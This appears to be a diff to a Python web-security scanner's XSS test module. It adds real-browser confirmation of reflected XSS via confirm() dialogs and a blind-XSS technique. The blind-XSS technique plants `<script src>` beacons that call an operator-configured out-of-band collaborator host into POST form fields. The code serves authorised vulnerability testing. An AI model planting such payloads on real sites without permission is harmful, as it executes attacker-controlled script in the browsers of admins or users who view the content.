@@ -103,6 +103,7 @@ from stof.payloads.registry import PayloadRegistry
 from ._injection_shared import (
     _second_order_plant_candidates,
     _second_order_verify_candidates,
+    build_collaborator_callback_url,
     build_params,
     injectable_endpoints,
     send_probe,
@@ -270,6 +271,17 @@ class XssTestConfig:
     # `config.testing.allow_state_changing_probes` in `main.py`'s
     # `_build_module_builders()`.
     allow_state_changing_probes: bool = False
+    # TC-128.10's out-of-band collaborator host -- the exact same
+    # operator-supplied `config.json` `burp.collaborator_url` field
+    # `SsrfTestConfig.collaborator_url` (TC-137.6) already reads, wired
+    # the same way in `main.py`'s `_build_module_builders()`. Empty by
+    # default (SKIPS the technique, same "no collaborator configured"
+    # convention TC-137.6 already established).
+    collaborator_url: str = ""
+    # TC-128.10 -- bounded plant-phase candidate count, same reasoning
+    # as `max_second_order_plant_targets` above: one real POST per
+    # candidate, capped to bound total request volume.
+    max_blind_xss_targets: int = 5
 
 
 class XssTestsModule(VulnModule):
@@ -369,6 +381,39 @@ class XssTestsModule(VulnModule):
                 candidates.append((endpoint, name, endpoint.location_for(name)))
         return candidates
 
+    async def _confirm_reflection_execution(
+        self, context, endpoint: "Endpoint", params: dict[str, str], timeout_ms: int = 10000,
+    ) -> "str | None":
+        """Best-effort real-browser confirmation for a reflected
+        finding whose payload is dialog-triggering (`confirm('{marker}')`):
+        rebuilds the exact GET-navigable URL that produced the unencoded
+        reflection and watches for the dialog actually firing, using the
+        same `page.on('dialog')` proof `_technique_dom_xss` (TC-128.5)
+        already established -- response-body inspection alone can't
+        distinguish "reflected into an executable position" from
+        "reflected into an inert context that still reads back
+        unencoded" (an HTML comment, a `<textarea>`, an already-
+        HTML-entity-encoded position a naive substring check missed);
+        an actually-triggered dialog can't be faked by either of those.
+
+        Only meaningful for GET/query-location candidates -- a POST-body
+        reflection can't be reproduced by navigating a bare URL, so
+        callers skip this for those (`endpoint.method` isn't GET or
+        `location` isn't "query") and keep the response-inspection-only
+        confidence tier. Returns the dialog's message, or `None` if no
+        page could be confirmed (navigation failure, or the dialog
+        simply never fired -- e.g. a CSP blocking inline script, which
+        is itself the correct "not exploitable here" outcome, not an
+        error)."""
+        query = urlencode(params)
+        split = urlsplit(endpoint.url)
+        probe_url = urlunsplit((split.scheme, split.netloc, split.path, query, split.fragment))
+        page = await context.new_page()
+        try:
+            return await self._navigate_and_check_dialog(page, probe_url, timeout_ms=timeout_ms)
+        finally:
+            await page.close()
+
     async def _technique_reflection(
         self, technique_id: str, technique_name: str, context_label: str,
         candidates: list[tuple["Endpoint", str, str]], context, evidence: "EvidenceCollector | None",
@@ -377,30 +422,62 @@ class XssTestsModule(VulnModule):
         side_effect_note: str = (
             "and its only side effect is a harmless confirm() dialog tagged with this run's own random marker"
         ),
+        confirm_execution: bool = True,
     ) -> TestCaseResult:
         """Shared body for all three context-variant techniques --
         each `_technique_*` wrapper below just supplies its own
         testcase id / human-readable name / context label and defers
-        here, so the probe-sweep-and-check loop exists exactly once."""
+        here, so the probe-sweep-and-check loop exists exactly once.
+
+        `confirm_execution` (default `True`, set `False` by the CSS
+        Injection / HTML Injection callers whose payloads deliberately
+        carry no `confirm()` call and so can never be browser-confirmed)
+        gates the TC-128.5-style real in-browser dialog check chained
+        onto a successful unencoded-reflection match: unencoded
+        reflection alone proves the byte made it back into the response
+        unescaped, not that it executes (a marker landing in an HTML
+        comment or an inert attribute reads back unencoded too, and is
+        not exploitable). When the chained browser check confirms a real
+        dialog fire, `confidence` is upgraded from "likely" to
+        "confirmed"; when it can't run (POST-body candidate) or doesn't
+        fire, the finding is still reported at "likely" exactly as
+        before -- this only ever strengthens confidence, never weakens
+        or suppresses a finding response-inspection already found."""
         if not candidates:
             return self._result(technique_id, technique_name, SKIPPED, "no query/body parameter discovered to probe")
 
         payload = self._payload_for(technique_id)
         bounded = candidates[: self.config.max_probe_targets]
         for endpoint, param, location in bounded:
-            probe = await send_probe(context, endpoint, build_params(endpoint, param, payload), location)
+            params = build_params(endpoint, param, payload)
+            probe = await send_probe(context, endpoint, params, location)
             if probe is None:
                 continue
             status, body, _elapsed, _headers = probe
             if not reflects_unencoded(body, payload):
                 continue
+
+            confidence = "likely"
+            execution_note = (
+                "This is a response-inspection signal only: the payload was never rendered in a "
+                f"real browser to confirm actual script execution, {side_effect_note}."
+            )
+            if confirm_execution and location == "query" and endpoint.method.upper() == "GET":
+                dialog_message = await self._confirm_reflection_execution(context, endpoint, params)
+                if dialog_message is not None and self._marker in dialog_message:
+                    confidence = "confirmed"
+                    execution_note = (
+                        f"Navigating a real browser to the same URL triggered a real confirm() "
+                        f"dialog whose message ({dialog_message!r}) contains this run's own unique "
+                        "marker -- genuine, confirmed in-browser script execution, not just an "
+                        "unencoded-reflection signal. The dialog was auto-dismissed immediately and "
+                        "had no other effect."
+                    )
             description = (
                 f"Injecting a uniquely-tagged marker payload into parameter '{param}' ({location}) "
                 f"on {endpoint.method} {endpoint.url} reflected byte-for-byte unencoded in the "
                 f"response (HTTP {status}), in a position consistent with {context_label} -- the "
-                "application did not HTML-encode this input before reflecting it. This is a "
-                "response-inspection signal only: the payload was never rendered in a real browser "
-                f"to confirm actual script execution, {side_effect_note}."
+                f"application did not HTML-encode this input before reflecting it. {execution_note}"
             )
             finding = Finding(
                 module_id=self.module_id, vuln_type=vuln_type, severity=severity, cvss_score=cvss_score,
@@ -409,16 +486,16 @@ class XssTestsModule(VulnModule):
                 response_raw=body[:300],
                 description=description,
                 recommendation="HTML-encode all untrusted output at the point it's rendered (context-aware encoding for HTML body, attribute, and script/event-handler positions); do not rely on input validation alone.",
-                # This technique's own description says so explicitly:
-                # "response-inspection signal only... never rendered in a
-                # real browser to confirm actual script execution" -- a
-                # real bug found via code audit (same class as idor_
-                # tests.py's own confidence bug): the prose already said
-                # unconfirmed, but the structured field defaulted to
-                # "confirmed" anyway, so the report's "Needs Manual
-                # Confirmation" badge never fired for exactly the
-                # reflected-XSS findings that most need it.
-                confidence="likely",
+                # See `confirm_execution`'s docstring above: "confirmed"
+                # only when the chained real-browser dialog check
+                # actually fired, "likely" (the previous, always-true
+                # default) otherwise -- a real bug found via code audit
+                # (same class as idor_tests.py's own confidence bug): the
+                # prose already said unconfirmed, but the structured
+                # field defaulted to "confirmed" anyway, so the report's
+                # "Needs Manual Confirmation" badge never fired for
+                # exactly the reflected-XSS findings that most need it.
+                confidence=confidence,
             )
             finding.evidence_refs = await evidence.capture_raw(finding.request_raw, finding.response_raw, label=f"xss-{technique_id}-{param}") if evidence else []
             return self._result(technique_id, technique_name, FAIL, description, role=self.config.low_priv_role, endpoint=endpoint, finding=finding, vuln_type=vuln_type)
@@ -519,6 +596,77 @@ class XssTestsModule(VulnModule):
             "endpoint(s) checked afterward, no unencoded reflection of the planted marker observed",
             role=self.config.high_priv_role, vuln_type="Stored Cross-Site Scripting",
         )
+
+    async def _technique_blind_xss_oob(
+        self,
+        endpoints: "list[Endpoint]",
+        session_manager: "SessionManager",
+        session_pool: "SessionPool",
+        evidence: "EvidenceCollector | None",
+    ) -> TestCaseResult:
+        """TC-128.10 -- closes this module's own real, honest gap the
+        same way `ssrf_tests.py`'s TC-137.6 closes SSRF's: TC-128.4's
+        stored-XSS plant/verify only ever checks endpoints STOF itself
+        discovered and can reach with its OWN two roles -- it
+        structurally cannot catch execution happening somewhere STOF
+        never crawled at all (an admin-only moderation queue, a backend
+        support dashboard, an email digest that renders the planted
+        value) or reviewed by a human operator rather than a role STOF
+        controls. Planting a payload that beacons out to an
+        operator-configured out-of-band collaborator instead of relying
+        on STOF re-reading the value itself is the only way to catch
+        that class -- see `build_collaborator_callback_url`'s own
+        docstring for why this, like TC-137.6, only ever SENDS the
+        marker and reports SKIPPED (never FAIL/PASS): STOF does not
+        poll the collaborator's own API for a received callback, so it
+        cannot itself confirm the outcome either way."""
+        tid, technique = "TC-128.10", "Blind Cross-Site Scripting via out-of-band collaborator callback"
+        vuln_type = "Cross-Site Scripting (blind, out-of-band)"
+        if not self.config.allow_state_changing_probes:
+            return self._result(tid, technique, SKIPPED, "allow_state_changing_probes is disabled -- this technique's plant phase requires a real POST", vuln_type=vuln_type)
+        if not self.config.collaborator_url:
+            return self._result(
+                tid, technique, SKIPPED,
+                "no out-of-band collaborator configured -- set it in Settings (Out-of-band testing) or "
+                "config.json's burp.collaborator_url to enable this technique",
+                vuln_type=vuln_type,
+            )
+
+        plant_candidates = _second_order_plant_candidates(endpoints, self.config.max_blind_xss_targets)
+        if not plant_candidates:
+            return self._result(tid, technique, SKIPPED, "no discovered POST form has a free-text-shaped field (comment/message/feedback/subject/notes/name/body) to plant a payload into", vuln_type=vuln_type)
+
+        try:
+            _plant_session, plant_context = await self._authenticated_context(session_manager, session_pool, self.config.low_priv_role, plant_candidates[0][0].url)
+        except KeyError as exc:
+            return self._result(tid, technique, SKIPPED, f"role '{self.config.low_priv_role}' not configured: {exc}", vuln_type=vuln_type)
+
+        sent: list[tuple[Endpoint, str, str]] = []
+        for plant_endpoint, plant_field in plant_candidates:
+            marker = f"stofbxss{secrets.token_hex(6)}"
+            callback_url = build_collaborator_callback_url(self.config.collaborator_url, marker)
+            payload = f'<script src="{callback_url}"></script>'
+            params = build_params(plant_endpoint, plant_field, payload)
+            location = plant_endpoint.location_for(plant_field)
+            probe = await send_probe(plant_context, plant_endpoint, params, location)
+            if probe is not None:
+                sent.append((plant_endpoint, plant_field, callback_url))
+
+        if not sent:
+            return self._result(tid, technique, SKIPPED, "every candidate plant request failed to send", vuln_type=vuln_type)
+
+        markers_preview = "; ".join(f"{endpoint.url}#{field}={url}" for endpoint, field, url in sent[:5])
+        detail = (
+            f"Planted {len(sent)} unique out-of-band beacon payload(s) (a <script src> callback tagged with "
+            f"its own marker) via the configured collaborator into free-text field(s): {markers_preview}"
+            f"{' (+' + str(len(sent) - 5) + ' more)' if len(sent) > 5 else ''}. STOF does not poll the "
+            "collaborator's own API for a received callback -- check its dashboard for an HTTP hit against "
+            "any marker above, whenever/wherever that planted value is eventually rendered (an admin panel, "
+            "a moderation queue, an email digest -- anywhere STOF's own crawl and roles cannot reach). A "
+            "callback received is confirmed blind XSS; this technique reports SKIPPED (not PASS) because "
+            "STOF itself cannot verify the outcome either way."
+        )
+        return self._result(tid, technique, SKIPPED, detail, role=self.config.low_priv_role, vuln_type=vuln_type)
 
     def _dom_xss_candidates(self, endpoints: "list[Endpoint]") -> "list[Endpoint]":
         """Discovered GET page/form endpoints -- capped at
@@ -832,7 +980,13 @@ class XssTestsModule(VulnModule):
                 for tid, name, label in technique_defs:
                     extra_kwargs = {}
                     if tid == "TC-128.7":
+                        # No confirm()/event-handler in this payload
+                        # (see `_payload_templates`) -- nothing for the
+                        # chained real-browser dialog check to ever
+                        # observe, so it's skipped rather than wastefully
+                        # attempted and always returning None.
                         vt = "CSS Injection"
+                        extra_kwargs = {"confirm_execution": False}
                     elif tid == "TC-128.9":
                         # Medium, not the High every script-executing
                         # technique in this module uses: content
@@ -845,6 +999,7 @@ class XssTestsModule(VulnModule):
                         extra_kwargs = {
                             "severity": "Medium", "cvss_score": 4.1,
                             "side_effect_note": "this payload deliberately carries no script or event-handler content at all",
+                            "confirm_execution": False,
                         }
                     else:
                         vt = "Reflected Cross-Site Scripting"
@@ -862,6 +1017,17 @@ class XssTestsModule(VulnModule):
         results.append(await self._safe_result(
             self._technique_stored_xss(endpoints, session_manager, session_pool, evidence),
             "TC-128", stored_tid, stored_technique, "Stored Cross-Site Scripting", role=self.config.low_priv_role,
+        ))
+
+        # TC-128.10 runs the same "independent of the candidates sweep"
+        # way -- it needs a discovered POST form with a free-text field
+        # (same shape as TC-128.4's plant phase), not a "query/body
+        # parameter", and never a verify phase of its own (see
+        # `_technique_blind_xss_oob`'s own docstring for why).
+        blind_tid, blind_technique = "TC-128.10", "Blind Cross-Site Scripting via out-of-band collaborator callback"
+        results.append(await self._safe_result(
+            self._technique_blind_xss_oob(endpoints, session_manager, session_pool, evidence),
+            "TC-128", blind_tid, blind_technique, "Cross-Site Scripting (blind, out-of-band)", role=self.config.low_priv_role,
         ))
 
         # TC-128.5 likewise runs independently -- it needs a discovered
